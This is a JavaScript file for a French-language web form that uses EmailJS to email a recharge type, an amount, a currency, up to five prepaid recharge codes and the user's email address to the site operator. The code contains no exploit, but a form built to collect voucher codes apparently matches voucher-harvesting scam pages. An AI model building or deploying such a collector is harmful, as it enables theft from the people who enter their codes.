function isEmailJSLoaded() {
  return typeof emailjs !== 'undefined';
}

function initEmailJS() {
  if (!isEmailJSLoaded()) {
    console.error('EmailJS library not loaded. Please check if the EmailJS script is properly included.');
    return;
  }

  try {
    emailjs.init("7dyXs7ectuACvtO12");
    console.log('EmailJS initialized successfully');
  } catch (error) {
    console.error('Failed to initialize EmailJS:', error.message);
  }
}

// Initialize EmailJS when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', initEmailJS);


function sendMail() {
  const loadingDiv = document.querySelector('.loading');
  const errorDiv = document.querySelector('.error-message');
  const successDiv = document.querySelector('.sent-message');
  
  // Check if EmailJS is loaded
  if (!isEmailJSLoaded()) {
    errorDiv.textContent = "Service de messagerie non disponible. Veuillez réessayer plus tard.";
    errorDiv.style.display = "block";
    return;
  }
  
  try {
    // Add loading state
    document.body.style.cursor = 'wait';
    loadingDiv.style.display = "block";
    
    var params = {
      crecharge: document.getElementById("rechargetype").value,
      montant: document.getElementById("montant").value,
      devise: document.getElementById("devise").value,
      recharge1: document.getElementById("recharge01").value,
      recharge2: document.getElementById("recharge02").value,
      recharge3: document.getElementById("recharge03").value,
      recharge4: document.getElementById("recharge04").value,
      recharge5: document.getElementById("recharge05").value,
      email: document.getElementById("email").value,
    };

    var rechargesFilled = false;
    for (var i = 1; i <= 5; i++) {
      if (document.getElementById("recharge0" + i).value !== "") {
        rechargesFilled = true;
        break;
      }
    }

    if (params.email === "" || params.montant === "" || params.devise === "" || !rechargesFilled) {
      errorDiv.textContent = "Veuillez remplir tous les champs obligatoires.";
      errorDiv.style.display = "block";
      successDiv.style.display = "none";
      return;
    }

    errorDiv.style.display = "none";
    successDiv.style.display = "none";

    const serviceID = "service_p6xjkwk";
    const templateID = "template_s1kqilp";

    // Set a shorter timeout for the email sending (15 seconds instead of 30)
    const emailTimeout = setTimeout(() => {
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      errorDiv.textContent = "Le délai d'attente est dépassé. Veuillez réessayer.";
      errorDiv.style.display = "block";
    }, 15000);

    emailjs.send(serviceID, templateID, params)
      .then(res => {
        clearTimeout(emailTimeout);
        document.body.style.cursor = 'default';
        // Clear form
        ["rechargetype", "email", "montant", "devise", 
         "recharge01", "recharge02", "recharge03", "recharge04", "recharge05"]
          .forEach(id => document.getElementById(id).value = "");
        
        loadingDiv.style.display = "none";
        successDiv.style.display = "block";
        console.log('Email sent successfully:', res);
      })
      .catch(err => {
        clearTimeout(emailTimeout);
        console.error('Email send error:', err);
        document.body.style.cursor = 'default';
        loadingDiv.style.display = "none";
        errorDiv.textContent = "Une erreur s'est produite. Veuillez réessayer.";
        errorDiv.style.display = "block";
      });
  } catch (error) {
    console.error('Error in sendMail:', error);
    document.body.style.cursor = 'default';
    loadingDiv.style.display = "none";
    errorDiv.textContent = "Une erreur inattendue s'est produite.";
    errorDiv.style.display = "block";
  }
}

// Export the function for use in HTML
window.sendMail = sendMail;